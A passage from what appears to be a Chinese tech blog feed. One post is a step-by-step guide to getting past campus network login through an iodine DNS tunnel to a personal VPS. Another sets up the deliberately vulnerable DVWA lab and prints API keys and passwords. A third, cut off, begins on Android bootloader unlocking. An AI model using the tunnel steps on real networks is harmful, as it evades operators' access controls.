。</p><p>但是，恰巧不幸的是，这种情况是很少存在的，也就是说53端口仅只允许 DNS 报文通过。如果是这种情况，还是有办法的。办法就是，使用 DNS 隧道。</p><p>简单来讲，既然53端口的 DNS 数据包可以通过网关/防火墙，那么就可以在本机运行一个程序，用来将其他端口数据包伪装成 DNS 数据包，发送到本地 DNS 服务器，这样网关/防火墙也不会进行拦截。但是这样仅只是将数据发送出去，如何回来呢？回来需要两个东西，一个是 VPS ，另一个就是域名。还得在域名购买商那里做如下解析设置：</p><table><thead><tr><th>主机记录</th><th>类型</th><th>值</th></tr></thead><tbody><tr><td>NS</td><td>d2t</td><td>tunnel.fanqxu.com</td></tr><tr><td>A</td><td>tunnel</td><td>148.70.218.239</td></tr></tbody></table><p>以上，d2t 和 tunnel 可以随意命名，最好还是命名规范；另外，VPS 公网 IP 为148.70.218.239。还有一点就是 VPS 是某马家的学生云，在此文发布之后，或可能未续费而停掉。意思就是说，不要想着搞我服务器了，虽然公网 IP 暴露了。</p><p>然后步入正题做个假设，我们在本机 PC 上将数据包伪装成 DNS 数据，且向本地 DNS 服务器指定将要查询一个域名，而本地域名服务器收到数据后，并不能成功解析，便只能将此数据包进行转发，转发到哪里呢？请注意上表中的 NS 记录，就是用来指定一个域名由 VPS 来进行解析；所以毫无疑问，数据包顺利地到达服务器。接下来我们同样可以在 VPS 上运行一个同样的程序，用来对伪装的数据包来进行还原，然后再将还原的数据包发送到互联网中。再然后服务器就会收到回来的响应数据包，再对此响应包进行 伪装成 DNS 响应数据包，按照过来的路径，反向地将伪装好的 DNS 响应数据包发送到本机 PC，PC 收到 DNS 伪装响应包后，再对其进行还原，最终达到本机 PC 收到真正需要的数据包。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g19hlzc5fkj313t0h8dg6.jpg" alt="flow chart"></p><h2 id="开始实战-Start-Combat"><a href="#开始实战-Start-Combat" class="headerlink" title="开始实战 / Start Combat"></a>开始实战 / Start Combat</h2><h3 id="原料属性"><a href="#原料属性" class="headerlink" title="原料属性"></a>原料属性</h3><ul><li>VPS<ul><li>Ubuntu 16 serevr</li><li>带宽 1 Mbps</li><li>IP 148.70.218.239</li></ul></li><li>Domain<ul><li>fanqxu.com</li></ul></li></ul><table><thead><tr><th>主机记录</th><th>记录</th><th>值</th></tr></thead><tbody><tr><td>NS</td><td>d2t</td><td>tunnel.fanqxu.com</td></tr><tr><td>A</td><td>tunnel</td><td>148.70.218.239</td></tr></tbody></table><ul><li>PC<ul><li>Ubuntu 18 desktop</li></ul></li></ul><h3 id="伪装程序"><a href="#伪装程序" class="headerlink" title="伪装程序"></a>伪装程序</h3><p>前面谈原理的时候，说到需要一个对数据包做 DNS 伪装的程序。而这个实现这种功能的程序有很多。</p><p>就拿我用过的两款软件来说，第一个是 dns2tcp，第二个，也就是要说的主角就是 iodine。由于前者相较于后者较复杂，使用未成功，故弃之，主要说后者。</p><p>官网：<a href="https://code.kryo.se/iodine/" target="_blank" rel="noopener">https://code.kryo.se/iodine/</a></p><p>Github：<a href="https://github.com/yarrick/iodine" target="_blank" rel="noopener">https://github.com/yarrick/iodine</a></p><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p>由于是 Debian 系，所以安装特简单。</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> sudo apt-get install iodine</span></span><br></pre></td></tr></table></figure><p>然后运行起来</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> sudo iodined -f -c -P password 10.0.0.1 d2t.fanqxu.com</span></span><br></pre></td></tr></table></figure><p>参数解释：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-f 　前台运行</span><br><span class="line">-c 　禁用检查所有传入请求的客户端IP地址；默认情况，来自不匹配IP请求将被拒绝。</span><br><span class="line">-P　 设置认证密码</span><br></pre></td></tr></table></figure><p>后面那个 IP 得是一个保留地址，再然后跟一个所要查询的域名。就这样让程序在 VPS 后台运行着。</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>同样是 Debian 系，安装方法同样。</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> sudo apt-get install iodine</span></span><br></pre></td></tr></table></figure><p>然后运行着，不要停止。</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> sudo iodine -f -P password d2t.fanqxu.com</span></span><br></pre></td></tr></table></figure><p>再然后，通过 ssh 服务器，使用9999端口来作为转发端口。</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ubuntu@10.0.0.1 -D 9999</span><br></pre></td></tr></table></figure><p>不用很久，就会登录到服务器。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g19hmmdu3gj313z0p0ar2.jpg" alt="一图概括"></p><p>当出现上图标记的那段文字，即为成功。</p><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>开启系统自带代理</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g19ho5btdmj30j90dljrj.jpg" alt=""></p><p>或者使用浏览器插件 <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">SwitchyOmega</a>（墙裂推荐）</p><p>Github：<a href="https://github.com/FelisCatus/SwitchyOmega" target="_blank" rel="noopener">github.com/FelisCatus/SwitchyOmega</a></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g19hohv40aj30vk0i7mxr.jpg" alt="">代理服务器即本机，端口9999。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g19hor8njfj30l80c9mxi.jpg" alt=""></p><h2 id="质量-Quality"><a href="#质量-Quality" class="headerlink" title="质量 / Quality"></a>质量 / Quality</h2><h3 id="关于网速"><a href="#关于网速" class="headerlink" title="关于网速"></a>关于网速</h3><p>我绕过认证次数总共两次，第一次是在凌晨接近2点左右，那时候网速还行；而第二次在在写这篇文章的白天下午，速度是出了奇的慢，打开个百度将近十秒钟。</p><p>另外，也和我的 VPS 出口带宽有莫大的关系；毕竟只有1Mbps。</p><h3 id="未遵循标准的结果"><a href="#未遵循标准的结果" class="headerlink" title="未遵循标准的结果"></a>未遵循标准的结果</h3><p>TCP/IP 四层体系结构已明确规定各个协议的作用，如果非要在不该传输正常数据的端口中传输一切数据，那结果也可想而知。</p><h2 id="着重强调-Emphasis"><a href="#着重强调-Emphasis" class="headerlink" title="着重强调 / Emphasis"></a>着重强调 / Emphasis</h2><h3 id="本文仅限于教育学习研究、技术学习！！！"><a href="#本文仅限于教育学习研究、技术学习！！！" class="headerlink" title="本文仅限于教育学习研究、技术学习！！！"></a><strong><font color="red">本文仅限于教育学习研究、技术学习！！！</font></strong></h3><h3 id="生命不止，折腾不息"><a href="#生命不止，折腾不息" class="headerlink" title="生命不止，折腾不息"></a><strong><font color="red">生命不止，折腾不息</font></strong></h3><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><p><a href="https://www.bennythink.com/udp53.html" target="_blank" rel="noopener">UDP 53 免费上网、DNS 隧道经验谈</a></p></li><li><p><a href="http://zgao.top/2019/03/03/%E5%88%A9%E7%94%A8openvpn%E5%AE%9E%E7%8E%B0udp536768%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E4%B8%8A%E7%BD%91/" target="_blank" rel="noopener">利用openVPN实现udp53,67,68端口绕过校园网认证上网</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;font color=&quot;red&quot;&gt;郑重声明：&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;font color=&quot;red&quot;&gt;本文仅限于教育学习研究、技术学习，严🈲用于商务及非法等损害某企业的事情；如若产生任何法律纠纷问题，均与本人无干系！！！ &lt;/font&gt;
&lt;/blockquote&gt;
&lt;p&gt;本文在绝大数人眼里或许是篇福利文；在此文中我将介绍如何通过 DNS TUNNEL 的方式来绕过校园网认证，实现免认证&lt;del&gt;免费&lt;/del&gt;上网；或许此招式并不是最优解，但对于绝大多数校园认证网确实能够成功实现。&lt;/p&gt;
    
    </summary>
    
      <category term="骚姿势" scheme="https://fanqxu.com/categories/%E9%AA%9A%E5%A7%BF%E5%8A%BF/"/>
    
    
      <category term="DNS" scheme="https://fanqxu.com/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>Web 渗透平台 DVWA 搭建</title>
    <link href="https://fanqxu.com/2019/01/14/DVWA/index.html"/>
    <id>https://fanqxu.com/2019/01/14/DVWA/index.html</id>
    <published>2019-01-14T06:52:04.000Z</published>
    <updated>2019-03-18T12:37:40.635Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>介于法律问题🧐，其实是由于个人能力不足加上怂了😅，没能力也更没胆去互联网上做这类攻击类测试。</p><p>遂有了此文，搭建这样一个满是漏洞的<strong><em>该死的易受攻击的 Web 应用程序</em></strong> 渗透平台。</p></blockquote><a id="more"></a><p> <strong><em><u>环境：</u></em></strong></p><ul><li>物理机 Ubuntu 18.04 desktop</li><li>VirtualBox 5.2.18_Ubuntu</li><li>服务器 Ubuntu 16.04 server</li><li>DVWA <ul><li><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></li><li><a href="http://dvwa.co.uk/" target="_blank" rel="noopener">http://dvwa.co.uk/</a></li></ul></li></ul><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6qy79j30rk0lygms.jpg" alt=""></p><p>此文分为三部分，第一部分为服务器的安装，第二部分为基本环境配置，第三部分为 DVWA 的部署。</p><h2 id="0x00-安装-Ubuntu-服务器"><a href="#0x00-安装-Ubuntu-服务器" class="headerlink" title="0x00 安装 Ubuntu 服务器"></a>0x00 安装 Ubuntu 服务器</h2><p>将 Ubuntu 16.04 server 安装至 VirtualBox ，当然安装到 VMware 中也行；其中一些简单的步骤并为截图。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6py3yj30hs0dcglg.jpg" alt=""></p><p>我的主机名，<strong><em>webServ</em></strong> </p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6pvaxj30m80goq2r.jpg" alt=""></p><p>设置用户名，亲测 <strong><em>admin</em></strong> 不可以 😂</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6q9v5j30m80godfo.jpg" alt=""></p><p>不要加密家目录</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6tdecj30m80go0sk.jpg" alt=""></p><p>将更改写入磁盘</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6tk6bj30m80go744.jpg" alt=""></p><p>不自动更新</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6t30lj30m80go745.jpg" alt=""></p><p>这里是重点，需选择如图所示三项，其中 <strong>LAMP</strong> 即分别为 Linux 、Apache、MySQL、PHP。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6uw1hj30m80goglg.jpg" alt=""></p><p>设置 MySQL 的 root 密码</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6xcrbj30m80goq2r.jpg" alt=""></p><p>完成安装后重启</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6xlidj30m80gowec.jpg" alt=""></p><p>本地物理机 ssh 连上服务器</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz60cpy7jdj31cj0jgwni.jpg" alt=""></p><h2 id="0x01-基本环境配置"><a href="#0x01-基本环境配置" class="headerlink" title="0x01 基本环境配置"></a>0x01 基本环境配置</h2><h3 id="卸载-PHP7"><a href="#卸载-PHP7" class="headerlink" title="卸载 PHP7"></a>卸载 PHP7</h3><p>由于我们需要的是 <em>PHP5</em> ，故通过下面一条命令将之前安装系统时装的 <strong>LAMP</strong> 中的 <em>PHP7</em> 卸载掉。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get purge `dpkg -l | grep php| awk <span class="hljs-string">'&#123;print $2&#125;'</span> |tr <span class="hljs-string">"\n"</span> <span class="hljs-string">" "</span>`</span><br></pre></td></tr></table></figure><h3 id="安装-PHP5"><a href="#安装-PHP5" class="headerlink" title="安装 PHP5"></a>安装 PHP5</h3><p>添加 <em>PHP5</em> 的 <strong><em>ppa</em></strong> 源</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository ppa:ondrej/php</span><br></pre></td></tr></table></figure><p>更新索引</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure><p>更新系统所有软件</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get upgrade</span><br></pre></td></tr></table></figure><p>安装 <em>PHP5</em></p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install php5.6</span><br></pre></td></tr></table></figure><h3 id="依赖性"><a href="#依赖性" class="headerlink" title="依赖性"></a>依赖性</h3><p>安装依赖</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml</span><br></pre></td></tr></table></figure><p>再次查看 <strong>PHP</strong> 版本</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php -v</span><br><span class="line">PHP 5.6.40-1+ubuntu16.04.1+deb.sury.org+1 (cli) </span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies</span><br></pre></td></tr></table></figure><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>开启 <em>Apache</em> 服务</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service apache2 start</span><br></pre></td></tr></table></figure><p>完成后可以打开本地网页查看 <em>Apache</em> 服务是否正常，此处的 <em>URL</em> 为服务器的 IP 地址。</p><ul><li><a href="http://192.168.43.218" target="_blank" rel="noopener">http://192.168.43.218</a></li></ul><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv70dvtj30vg0n83zw.jpg" alt=""></p><p>启用 <em>Apache</em> 中的 <em>PHP5.6</em> 模块</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ sudo a2enmod php5.6</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">        LANGUAGE = (<span class="hljs-built_in">unset</span>),</span><br><span class="line">        LC_ALL = (<span class="hljs-built_in">unset</span>),</span><br><span class="line">        LC_PAPER = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LC_ADDRESS = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LC_MONETARY = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LC_NUMERIC = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LC_TELEPHONE = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LC_IDENTIFICATION = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LC_MEASUREMENT = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LC_CTYPE = <span class="hljs-string">"en_US.UTF-8"</span>,</span><br><span class="line">        LC_TIME = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LC_NAME = <span class="hljs-string">"zh_CN.UTF-8"</span>,</span><br><span class="line">        LANG = <span class="hljs-string">"en_US.UTF-8"</span></span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to a fallback locale (<span class="hljs-string">"en_US.UTF-8"</span>).</span><br><span class="line">Considering dependency mpm_prefork <span class="hljs-keyword">for</span> php5.6:</span><br><span class="line">Considering conflict mpm_event <span class="hljs-keyword">for</span> mpm_prefork:</span><br><span class="line">Considering conflict mpm_worker <span class="hljs-keyword">for</span> mpm_prefork:</span><br><span class="line">Module mpm_prefork already enabled</span><br><span class="line">Considering conflict php5 <span class="hljs-keyword">for</span> php5.6:</span><br><span class="line">Module php5.6 already enabled</span><br></pre></td></tr></table></figure><p>重启 <em>Apache</em> 服务</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service apache2 restart</span><br></pre></td></tr></table></figure><h2 id="0x02-DVWA-部署"><a href="#0x02-DVWA-部署" class="headerlink" title="0x02 DVWA 部署"></a>0x02 DVWA 部署</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>下载 <em>DVWA</em> 到本地服务器</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre></td></tr></table></figure><p>解压到相应目录</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install unzip</span><br><span class="line">$ sudo unzip DWVA-master.zip -d /var/www/html/dvwa</span><br></pre></td></tr></table></figure><p>这时就可以打开 <em>Web</em> 界面</p><ul><li><a href="http://192.168.43.218/DVWA/setup.php" target="_blank" rel="noopener">http://192.168.43.218/DVWA/setup.php</a></li></ul><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv6zixuj30vd0n8glo.jpg" alt=""></p><p>提示需将一个配置文件修改名字</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">cd</span> /var/www/html/dvwa/config/</span><br><span class="line">$ sudo mv config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure><p>再次打开 <em>Web</em> 界面</p><h3 id="选项及-PHP-模块-gd"><a href="#选项及-PHP-模块-gd" class="headerlink" title="选项及 PHP 模块 gd"></a>选项及 PHP 模块 gd</h3><blockquote><p>此后，就根据Web界面的提示依次完成相应配置</p></blockquote><p>开启 <em>allow_url_include</em>，</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi /etc/php/5.6/apache2/php.ini</span><br></pre></td></tr></table></figure><p>开启这个就可让 <em>include include_once require</em> 和 <em>require_once</em> 都能用 <em>url</em> 和伪协议</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure><p>安装 <em>PHP</em> 的一个模块</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install php5.6-gd</span><br></pre></td></tr></table></figure><p>打开 <em>Web</em> 界面查看</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv72obbj30p50pjgmk.jpg" alt=""></p><h3 id="秘钥"><a href="#秘钥" class="headerlink" title="秘钥"></a>秘钥</h3><p>下一个就是 <em>reCAPTCHA key</em>，这个就有点麻烦，可能得需一个<em>Google</em>账号加科学上网。首先打开 <em>dvwa</em> 目录下的 <em>config</em> 目录下的一个配置文件。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi dvwa/config/config.inc.php</span><br></pre></td></tr></table></figure><p>打开后找到一下字段……</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># ReCAPTCHA settings</span></span><br><span class="line"><span class="hljs-comment">#   Used for the 'Insecure CAPTCHA' module</span></span><br><span class="line"><span class="hljs-comment">#   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin</span></span><br><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'recaptcha_public_key'</span> ]  = <span class="hljs-string">''</span>;</span><br><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'recaptcha_private_key'</span> ] = <span class="hljs-string">''</span>;</span><br></pre></td></tr></table></figure><p>按照提示，打开以上那个链接……</p><ul><li><a href="https://www.google.com/recaptcha/admin" target="_blank" rel="noopener">https://www.google.com/recaptcha/admin</a></li></ul><p><strong>Label</strong> 栏里就填上 <strong><em>DVWA</em></strong> ，然后勾选 <em>reCAPTCHA v3</em> 以及 <em>Accept</em> ，最后点击 <em>Register</em> 。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv71o9oj30ez0modg5.jpg" alt=""></p><p>将秘钥复制到配置文件中的相应位置，</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv71mojj30qt0lzwf5.jpg" alt=""></p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'recaptcha_public_key'</span> ]  = <span class="hljs-string">'6LfKd4kUAAAAAEk6g_eoecny__1zZwdknXuE2Lju'</span>;</span><br><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'recaptcha_private_key'</span> ] = <span class="hljs-string">'6LfKd4kUAAAAAECiwIiv5nrmh_k75TsKabJt0f3W'</span>;</span><br></pre></td></tr></table></figure><p>保存退出，刷新页面就会看到生效。</p><h3 id="目录可写权"><a href="#目录可写权" class="headerlink" title="目录可写权"></a>目录可写权</h3><p>将上面三个目录修改可写权限</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chgrp www-data /var/www/html/dvwa/hackable/uploads/</span><br><span class="line">$ sudo chgrp www-data /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class="line">$ sudo chgrp www-data /var/www/html/dvwa/config/</span><br></pre></td></tr></table></figure><h3 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h3><p>最后，还有一个小问题就是关于数据库的密码，还是打开那个配置文件</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi dvwa/config/config.inc.php</span><br></pre></td></tr></table></figure><p>找到以下字段</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-variable">$_DVWA</span> = array();</span><br><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'db_server'</span> ]   = <span class="hljs-string">'127.0.0.1'</span>;</span><br><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'db_database'</span> ] = <span class="hljs-string">'dvwa'</span>;</span><br><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'db_user'</span> ]     = <span class="hljs-string">'root'</span>;</span><br><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'db_password'</span> ] = <span class="hljs-string">'p@aap0rd'</span>;</span><br></pre></td></tr></table></figure><p>重点是最后这一项，将引号中的密码设置为之前设置的 <strong><em>MySQL</em></strong> 数据库密码</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'db_password'</span> ] = <span class="hljs-string">'toor'</span>;</span><br></pre></td></tr></table></figure><p>而不是设置为空密码，若设置为空密码，点击 <code>Create/Reset Database</code> 就会出现<strong><em>不能连接 MySQL 服务</em></strong> 。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv70oqfj30ij068gli.jpg" alt=""></p><p>设置正确后再次点击 <code>Create/Reset Database</code> </p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv738f1j30if0baweg.jpg" alt=""></p><p>点击登录，默认用户名 <em>admin</em> 密码 <em>password</em></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv73s7xj30fa09imx2.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fz5zv76466j30p40m1dhf.jpg" alt=""></p><p>完成！！！</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;介于法律问题🧐，其实是由于个人能力不足加上怂了😅，没能力也更没胆去互联网上做这类攻击类测试。&lt;/p&gt;
&lt;p&gt;遂有了此文，搭建这样一个满是漏洞的&lt;strong&gt;&lt;em&gt;该死的易受攻击的 Web 应用程序&lt;/em&gt;&lt;/strong&gt; 渗透平台。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="TechShare" scheme="https://fanqxu.com/categories/TechShare/"/>
    
    
      <category term="Web" scheme="https://fanqxu.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>拿到Android Root管理权</title>
    <link href="https://fanqxu.com/2019/01/03/mi5s-magisk/index.html"/>
    <id>https://fanqxu.com/2019/01/03/mi5s-magisk/index.html</id>
    <published>2019-01-03T15:15:40.000Z</published>
    <updated>2019-04-27T04:27:17.633Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>首先，<strong>安全第一</strong>，请不要将日常生活使用的手机拿来这样搞；尤其是用来做支付的手机。</p><p>其次，高可玩性得益于 Android 的开源。此文章仅算入坑，适合爱折腾的小白朋友；Android 机拿到最高权限的思路都类似，同是安卓机，即可借鉴。</p><p>高可玩性，是有了 <em>root</em> 管理权后的自由，所以便有了此文。</p></blockquote><a id="more"></a><h5 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h5><ul><li>代号 <em>capricorn</em> 的 Mi 5S</li><li>MIUI 10</li><li>Android 7.0</li></ul><h5 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h5><ul><li><em>Windows</em> 系统（最好不要使用虚拟机）</li><li><em>USB</em> 数据线</li><li>需登录小米账号</li><li>电量得足，最好<em>100%</em></li><li>手机上开启 <em>USB</em> 调试</li></ul><p>关于如何开开启 <em>USB</em> 调试，打开【设置】&gt;&gt;&gt;【我的设备】&gt;&gt;&gt;【全部参数】&gt;&gt;&gt;【MIUI 版本】连续点击6下，回到【设置】首页，进入【更多设置】&gt;&gt;&gt;【开发者选项】，找到并点亮<code>USB调试</code>。</p><p style="text-align: center;"> <img src="http://ww1.sinaimg.cn/mw690/006V665tgy1fytsk5x9n1j30u01hctaa.jpg" width="50%" height="40%"> </p><h2 id="Bootloader解锁"><a href="#Bootloader解锁" class="headerlink" title="Bootloader解锁"></a>Bootloader解锁</h2><p>小米手机解锁申请：</p><p><a href="http://www.miui.com/unlock/index.html" target="_blank" rel="noopener">http://www.miui.com/unlock/index.html</a></p><p>申请成功后，将解锁工具下载并解压到本地，打开可以看到以下文件</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fytse7q9w1j30kg0f475t.jpg" alt=""></p><p>由于我不是Windows系统，所以窗口和图标有所不同，但文件名都相同；其中</p><ul><li><code>driver_install_64.exe</code> 一个为64位的<em>Windows</em>安装驱动的文件</li><li><code>MiUsbDriver.exe</code> 为安装<em>USB</em>驱动文件</li><li><code>miflash_unlock.exe</code> 